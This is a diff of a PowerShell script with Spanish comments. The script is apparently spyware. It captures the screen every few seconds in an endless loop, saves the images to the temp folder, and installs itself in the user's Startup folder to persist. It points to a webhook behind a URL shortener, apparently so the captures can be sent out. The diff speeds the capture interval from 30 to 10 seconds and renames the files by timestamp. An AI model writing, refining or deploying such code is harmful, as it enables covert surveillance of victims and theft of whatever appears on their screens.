@@ -11,13 +11,11 @@ $hookurl = "https://is.gd/xSsigk"  # Reemplaza "URL_DEL_WEBHOOK" con la URL de t
 # Definir el contenido del script
 $scriptContent = @"
 `$hookurl = "$hookurl"
-`$seconds = 30 # Intervalo de captura de pantalla en segundos
-`$a = 0 # Contador de capturas de pantalla
+`$seconds = 10 # Intervalo de captura de pantalla en segundos
 
 # Bucle infinito para tomar capturas de pantalla continuamente
 while (`$true) {
-    `$a++
-    `$Filett = "$env:temp\SC_$a.png"  # Ruta del archivo de la captura de pantalla
+    `$Filett = "$env:temp\SC_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"  # Ruta del archivo de la captura de pantalla
     
     # Obtiene las dimensiones de la pantalla virtual
     `$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
@@ -45,7 +43,7 @@ while (`$true) {
 }
 "@
 
-# Obtener la ruta de la carpeta de inicio del usuario actual
+# Definir la ruta de la carpeta de inicio del usuario actual
 $startupFolder = [Environment]::GetFolderPath("Startup")
 
 # Definir la ruta completa del script en la carpeta de inicio
